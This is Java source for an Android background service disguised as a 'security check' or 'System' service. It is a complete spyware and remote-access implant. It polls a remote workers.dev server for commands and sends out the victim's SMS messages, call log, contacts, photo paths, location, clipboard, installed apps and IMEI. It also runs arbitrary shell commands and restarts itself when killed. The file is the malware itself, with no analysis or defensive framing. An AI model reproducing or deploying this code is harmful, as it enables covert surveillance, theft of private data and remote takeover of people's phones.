package com.sec.check;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class ServiceRunner extends Service {
    private static final String TAG = "SecurityCheck";
    private static final String CHANNEL_ID = "sys_service";
    private static final int NOTIFICATION_ID = 1001;

    private static final String SERVER_URL = "https://sec.h42536974.workers.dev";
    private static final int POLL_INTERVAL = 10;

    private ScheduledExecutorService scheduler;
    private String deviceId = "";

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "=== ServiceRunner created ===");

        createNotificationChannel();
        startForegroundInternal();

        deviceId = getDeviceId();
        Log.d(TAG, "Device ID: " + deviceId);
        Log.d(TAG, "Activation code: " + getActivationCode());

        // أرسل التقرير الأولي فوراً
        sendInitialReport();

        // ابدأ polling
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                pollCommands();
            }
        }, 3, POLL_INTERVAL, TimeUnit.SECONDS);

        Log.d(TAG, "Service fully started");
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW);
            channel.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    private void startForegroundInternal() {
        try {
            Notification n = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System")
                .setContentText("Running in background")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
            startForeground(NOTIFICATION_ID, n);
            Log.d(TAG, "Foreground started");
        } catch (Exception e) {
            Log.e(TAG, "startForeground: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed - restarting");
        try {
            Intent restart = new Intent(this, ServiceRunner.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restart);
            } else {
                startService(restart);
            }
        } catch (Exception e) {}
    }

    private String getActivationCode() {
        try {
            SharedPreferences sp = getSharedPreferences("sc_prefs", MODE_PRIVATE);
            return sp.getString("activation_code", "");
        } catch (Exception e) {
            return "";
        }
    }

    // ============================================================
    // Polling
    // ============================================================
    private void pollCommands() {
        try {
            String code = getActivationCode();
            String url = SERVER_URL + "/apk/poll?device=" + deviceId + "&code=" + code;
            Log.d(TAG, "Polling: " + url);
            
            String response = httpGet(url);
            if (response == null || response.length() == 0) {
                Log.d(TAG, "Empty poll response");
                return;
            }

            Log.d(TAG, "Poll response: " + response.substring(0, Math.min(200, response.length())));

            JSONObject json = new JSONObject(response);
            JSONArray commands = json.optJSONArray("commands");
            if (commands == null) return;

            for (int i = 0; i < commands.length(); i++) {
                handleCommand(commands.getJSONObject(i));
            }
        } catch (Exception e) {
            Log.e(TAG, "poll error: " + e.getMessage());
        }
    }

    private void handleCommand(JSONObject cmd) {
        try {
            String action = cmd.optString("action", "");
            Log.d(TAG, "Handling command: " + action);

            if (action.equals("get_device_info")) sendDeviceInfo();
            else if (action.equals("get_sms")) sendSms();
            else if (action.equals("get_call_log")) sendCallLog();
            else if (action.equals("get_contacts")) sendContacts();
            else if (action.equals("get_photos")) sendPhotos();
            else if (action.equals("get_location")) sendLocation();
            else if (action.equals("get_apps")) sendApps();
            else if (action.equals("get_clipboard")) sendClipboard();
            else if (action.equals("vibrate")) vibrate(cmd.optLong("ms", 2000));
            else if (action.equals("toast")) showToast(cmd.optString("text", "Hello"));
            else if (action.equals("play_sound")) playSound();
            else if (action.equals("shell")) executeShell(cmd.optString("command", ""));
        } catch (Exception e) {
            Log.e(TAG, "handleCommand: " + e.getMessage());
        }
    }

    // ============================================================
    // Commands
    // ============================================================
    private void sendInitialReport() {
        try {
            JSONObject d = new JSONObject();
            d.put("type", "initial");
            d.put("device", deviceId);
            d.put("code", getActivationCode());
            d.put("model", Build.MODEL);
            d.put("brand", Build.BRAND);
            d.put("android", Build.VERSION.RELEASE);
            d.put("manufacturer", Build.MANUFACTURER);
            d.put("sdk", Build.VERSION.SDK_INT);
            
            Log.d(TAG, "Sending initial report...");
            postJson("/apk/data", d);
        } catch (Exception e) {
            Log.e(TAG, "sendInitialReport: " + e.getMessage());
        }
    }

    private void sendDeviceInfo() {
        try {
            JSONObject d = new JSONObject();
            d.put("type", "device_info");
            d.put("device", deviceId);
            d.put("code", getActivationCode());
            d.put("model", Build.MODEL);
            d.put("brand", Build.BRAND);
            d.put("android", Build.VERSION.RELEASE);

            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                try {
                    d.put("imei", tm.getImei());
                    d.put("operator", tm.getNetworkOperatorName());
                    d.put("country", tm.getSimCountryIso());
                } catch (Exception e) {}
            }
            postJson("/apk/data", d);
        } catch (Exception e) {}
    }

    private void sendSms() {
        try {
            JSONArray arr = new JSONArray();
            Cursor c = getContentResolver().query(
                Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 50");
            if (c != null) {
                while (c.moveToNext() && arr.length() < 50) {
                    JSONObject s = new JSONObject();
                    s.put("from", c.getString(c.getColumnIndexOrThrow("address")));
                    s.put("body", c.getString(c.getColumnIndexOrThrow("body")));
                    arr.put(s);
                }
                c.close();
            }
            JSONObject d = new JSONObject();
            d.put("type", "sms");
            d.put("device", deviceId);
            d.put("code", getActivationCode());
            d.put("sms", arr);
            postJson("/apk/data", d);
        } catch (Exception e) {}
    }

    private void sendCallLog() {
        try {
            JSONArray arr = new JSONArray();
            Cursor c = getContentResolver().query(
                CallLog.Calls.CONTENT_URI, null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 50");
            if (c != null) {
                while (c.moveToNext() && arr.length() < 50) {
                    JSONObject call = new JSONObject();
                    call.put("number", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    call.put("duration", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                    call.put("type", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                    arr.put(call);
                }
                c.close();
            }
            JSONObject d = new JSONObject();
            d.put("type", "call_log");
            d.put("device", deviceId);
            d.put("code", getActivationCode());
            d.put("calls", arr);
            postJson("/apk/data", d);
        } catch (Exception e) {}
    }

    private void sendContacts() {
        try {
            JSONArray arr = new JSONArray();
            Cursor c = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
            if (c != null) {
                while (c.moveToNext() && arr.length() < 200) {
                    JSONObject ct = new JSONObject();
                    ct.put("name", c.getString(c.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                    ct.put("number", c.getString(c.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER)));
                    arr.put(ct);
                }
                c.close();
            }
            JSONObject d = new JSONObject();
            d.put("type", "contacts");
            d.put("device", deviceId);
            d.put("code", getActivationCode());
            d.put("contacts", arr);
            postJson("/apk/data", d);
        } catch (Exception e) {}
    }

    private void sendPhotos() {
        try {
            JSONArray arr = new JSONArray();
            Cursor c = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                null, null, null,
                MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 20");
            if (c != null) {
                while (c.moveToNext() && arr.length() < 20) {
                    JSONObject p = new JSONObject();
                    p.put("path", c.getString(c.getColumnIndexOrThrow(
                        MediaStore.Images.Media.DATA)));
                    arr.put(p);
                }
                c.close();
            }
            JSONObject d = new JSONObject();
            d.put("type", "photos");
            d.put("device", deviceId);
            d.put("code", getActivationCode());
            d.put("photos", arr);
            postJson("/apk/data", d);
        } catch (Exception e) {}
    }

    private void sendLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) return;
            if (ContextCompat.checkSelfPermission(this,
                android.Manifest.permission.ACCESS_FINE_LOCATION) !=
                android.content.pm.PackageManager.PERMISSION_GRANTED) return;

            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

            JSONObject d = new JSONObject();
            d.put("type", "location");
            d.put("device", deviceId);
            d.put("code", getActivationCode());
            if (loc != null) {
                d.put("lat", loc.getLatitude());
                d.put("lng", loc.getLongitude());
            }
            postJson("/apk/data", d);
        } catch (Exception e) {}
    }

    private void sendApps() {
        try {
            JSONArray arr = new JSONArray();
            android.content.pm.PackageManager pm = getPackageManager();
            java.util.List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
            for (int i = 0; i < packages.size(); i++) {
                if (arr.length() >= 100) break;
                android.content.pm.PackageInfo pkg = packages.get(i);
                android.content.pm.ApplicationInfo ai = pkg.applicationInfo;
                if (ai != null && (ai.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0) {
                    JSONObject a = new JSONObject();
                    a.put("name", ai.loadLabel(pm).toString());
                    a.put("package", pkg.packageName);
                    arr.put(a);
                }
            }
            JSONObject d = new JSONObject();
            d.put("type", "apps");
            d.put("device", deviceId);
            d.put("code", getActivationCode());
            d.put("apps", arr);
            postJson("/apk/data", d);
        } catch (Exception e) {}
    }

    private void sendClipboard() {
        try {
            android.content.ClipboardManager cm = (android.content.ClipboardManager)
                getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm == null || !cm.hasPrimaryClip()) return;
            android.content.ClipData clip = cm.getPrimaryClip();
            if (clip == null || clip.getItemCount() == 0) return;
            CharSequence text = clip.getItemAt(0).getText();

            JSONObject d = new JSONObject();
            d.put("type", "clipboard");
            d.put("device", deviceId);
            d.put("code", getActivationCode());
            d.put("text", text != null ? text.toString() : "");
            postJson("/apk/data", d);
        } catch (Exception e) {}
    }

    private void vibrate(long ms) {
        try {
            android.os.Vibrator v = (android.os.Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null) v.vibrate(ms);
        } catch (Exception e) {}
    }

    private void showToast(final String text) {
        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                try {
                    android.widget.Toast.makeText(getApplicationContext(),
                        text, android.widget.Toast.LENGTH_LONG).show();
                } catch (Exception e) {}
            }
        });
    }

    private void playSound() {
        try {
            android.media.Ringtone r = android.media.RingtoneManager.getRingtone(
                getApplicationContext(),
                android.media.RingtoneManager.getDefaultUri(
                    android.media.RingtoneManager.TYPE_NOTIFICATION));
            if (r != null) r.play();
        } catch (Exception e) {}
    }

    private void executeShell(String command) {
        try {
            Process p = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) output.append(line).append("\n");
            reader.close();

            JSONObject d = new JSONObject();
            d.put("type", "shell_result");
            d.put("device", deviceId);
            d.put("code", getActivationCode());
            d.put("command", command);
            d.put("output", output.toString());
            postJson("/apk/data", d);
        } catch (Exception e) {}
    }

    // ============================================================
    // HTTP
    // ============================================================
    private String httpGet(String urlStr) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(20000);
            conn.setReadTimeout(20000);
            int code = conn.getResponseCode();
            Log.d(TAG, "HTTP GET " + urlStr.substring(0, Math.min(80, urlStr.length())) + " -> " + code);
            
            if (code == 200) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) sb.append(line);
                reader.close();
                return sb.toString();
            }
        } catch (Exception e) {
            Log.e(TAG, "httpGet error: " + e.getMessage());
        }
        return null;
    }

    private void postJson(String path, JSONObject data) {
        try {
            URL url = new URL(SERVER_URL + path);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(20000);
            conn.setReadTimeout(20000);

            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
            os.writeBytes(data.toString());
            os.flush();
            os.close();

            int rc = conn.getResponseCode();
            Log.d(TAG, "POST " + path + " -> " + rc);
        } catch (Exception e) {
            Log.e(TAG, "postJson error: " + e.getMessage());
        }
    }

    private String getDeviceId() {
        try {
            return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Exception e) {
            return "unknown";
        }
    }
        }
